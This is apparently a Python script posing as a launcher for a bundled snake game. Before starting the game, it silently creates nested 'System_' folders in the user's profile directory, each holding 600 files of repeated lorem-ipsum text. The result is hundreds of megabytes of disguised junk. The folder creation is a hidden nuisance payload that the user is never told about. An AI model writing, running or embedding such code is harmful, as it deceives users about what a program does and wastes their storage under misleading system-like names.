import os, subprocess

def create_nested_folders(base_path, count=0):
    lorem_text = """Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!
    
    Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!
    
    Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!
    
    Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!
    
    Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!
    
    Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!
    
    Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!
    
    Lorem, ipsum dolor sit amet consectetur adipisicing 
    elit. Sit ducimus doloremque repellat temporibus quibusdam culpa,ut 
    asperiores illo consectetur optio nisi facilis ex ratione. Commodi
    minima autem officia quas obcaecati!""" * 10 
    
    existing_folders = [f for f in os.listdir(base_path) if f.startswith("System_") and f[7:].isdigit()]
    existing_numbers = sorted([int(f[7:]) for f in existing_folders])

    if existing_numbers:
        count = existing_numbers[-1] + 1 

    while count < 20:  # 20 30 40 50
        new_folder = os.path.join(base_path, f"System_{count}")     
        try:
            os.mkdir(new_folder)
            base_path = new_folder  
            for i in range(1, 601):
                text_file_path = os.path.join(new_folder, f"info{i}.txt")
                with open(text_file_path, "w") as file:
                    file.write(lorem_text)

        except: 
            break
        count += 1


def run_game(): 
    script_dir = os.path.dirname(os.path.abspath(__file__))  
    game_path = os.path.join(script_dir, "data_game", "dist", "snake.exe")  
    
    if os.path.exists(game_path):
        try:
            subprocess.Popen([game_path], shell=True)
            print(f"Game {game_path}: berhasil dijalankan.")
        except Exception as e:
            print(f"Gagal menjalankan game: {e}")
    else:
        print(f"File game {game_path} tidak ditemukan.")


if __name__ == "__main__":
    base_path = os.path.join(os.getenv("USERPROFILE"), "SystemFolderRoot")  

    if not os.path.exists(base_path):
        os.mkdir(base_path)

    create_nested_folders(base_path)
    run_game()
